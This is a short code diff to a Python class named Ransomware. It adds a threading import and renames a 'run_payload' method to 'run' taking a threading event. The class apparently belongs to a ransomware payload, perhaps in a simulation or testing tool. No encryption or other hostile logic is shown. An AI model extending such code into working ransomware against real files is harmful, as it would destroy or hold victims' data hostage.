@@ -1,4 +1,5 @@
 import logging
+import threading
 from pathlib import Path
 from typing import Callable, List
 
@@ -32,7 +33,7 @@ class Ransomware:
             self._target_directory / README_FILE_NAME if self._target_directory else None
         )
 
-    def run_payload(self):
+    def run(self, _: threading.Event):
         if not self._target_directory:
             return
 
